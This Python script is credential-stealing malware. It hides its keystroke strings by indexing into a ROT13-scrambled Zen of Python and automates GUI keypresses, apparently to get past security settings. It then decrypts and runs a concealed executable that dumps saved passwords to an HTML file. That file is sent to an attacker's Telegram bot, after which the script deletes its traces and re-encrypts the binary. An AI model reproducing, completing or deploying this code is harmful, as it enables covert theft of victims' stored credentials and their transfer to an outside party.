from pyautogui import hotkey, write, press
from cryptography.fernet import Fernet
from subprocess import run
from telegram import Bot
from time import sleep
from os import remove


vf = """Gur Mra bs Clguba, ol Gvz Crgref

Ornhgvshy vf orggre guna htyl.
Rkcyvpvg vf orggre guna vzcyvpvg.
Fvzcyr vf orggre guna pbzcyrk.
Pbzcyrk vf orggre guna pbzcyvpngrq.
Syng vf orggre guna arfgrq.
Fcnefr vf orggre guna qrafr.
Ernqnovyvgl pbhagf.
Fcrpvny pnfrf nera'g fcrpvny rabhtu gb oernx gur ehyrf.
Nygubhtu cenpgvpnyvgl orngf chevgl.
Reebef fubhyq arire cnff fvyragyl.
Hayrff rkcyvpvgyl fvyraprq.
Va gur snpr bs nzovthvgl, ershfr gur grzcgngvba gb thrff.
Gurer fubhyq or bar-- naq cersrenoyl bayl bar --boivbhf jnl gb qb vg.
Nygubhtu gung jnl znl abg or boivbhf ng svefg hayrff lbh'er Qhgpu.
Abj vf orggre guna arire.
Nygubhtu arire vf bsgra orggre guna *evtug* abj.
Vs gur vzcyrzragngvba vf uneq gb rkcynva, vg'f n onq vqrn.
Vs gur vzcyrzragngvba vf rnfl gb rkcynva, vg znl or n tbbq vqrn.
Anzrfcnprf ner bar ubaxvat terng vqrn -- yrg'f qb zber bs gubfr!"""

_dorn_ = {}
for c42 in (65, 97):
    for c_42 in range(26):
        _dorn_[chr(c_42+c42)] = chr((c_42+13) % 26 + c42)

_ = "".join([_dorn_.get(c, c) for c in vf])
symbol = '&'
num = '4'


def gui(sec, _press_):
    sleep(sec)
    hotkey(f'{_[799] + _[770] + _[695] + _[678]}', f'{_[2] + _[31] + _[799]}')
    sleep(sec)
    write(f'{_[351] + _[330] + _[292] + _[275] + _[31] + _[3]}' + f'{symbol}' +
          f'{_[3] + _[13:15] + _[-12] + _[-2] + _[-28] + _[13] + _[3] + _[-59]}' +
          f'{_[483] + _[549:551] + _[-2] + _[589] + _[770] + _[23] + _[8] + _[6]}')
    sleep(sec)
    press(f'{_[2] + _[6] + _[-6] + _[-2] + _[30]}')
    sleep(sec)
    hotkey(f'{_[742:744] + _[19]}')
    sleep(sec)
    hotkey(f'{_[742:744] + _[19]}')
    sleep(sec)
    hotkey(f'{_[742:744] + _[19]}')
    sleep(sec)
    hotkey(f'{_[742:744] + _[19]}')
    sleep(sec)
    press(f'{_[2] + _[6] + _[-6] + _[-2] + _[30]}')
    sleep(sec)
    hotkey(f'{_[31] + _[482] + _[478] + _[393] + _[350]}')
    hotkey(f'{_[526:529]}', f'{_[9] + num}')


def get_pass():
    none = 'q7mbBAL4wvlIKAy06Rfm29byok4_MlN8D9nxdogRSto='
    with open('ERROR.exe', 'rb') as decode:
        content = decode.read()
    with open('ERROR.exe', 'wb') as decode:
        content_decode = Fernet(none).decrypt(content)
        decode.write(content_decode)
    with open('LAUNCH.bat', 'a') as bat_file:
        bat_file.write('start ERROR.exe  /shtml MUMMYA.html')
    run(['LAUNCH.bat'], shell=True)
    sleep(1)
    with open('MUMMYA.html', 'rb') as bit_html:
        content = bit_html.read()

    tele_bot = 'Enter Your Token Bot!'
    user_id = 'Enter Your ID Telegram!'
    bot = Bot(token=tele_bot)
    bot.send_document(chat_id=user_id, document=content, filename='Evil.html')
    remove('MUMMYA.html')
    remove('LAUNCH.bat')
    with open('ERROR.exe', 'rb') as encrypt:
        content = encrypt.read()
    with open('ERROR.exe', 'wb') as encrypt:
        content_encrypt = Fernet(none).encrypt(content)
        encrypt.write(content_encrypt)


gui(1, 'enter')
get_pass()


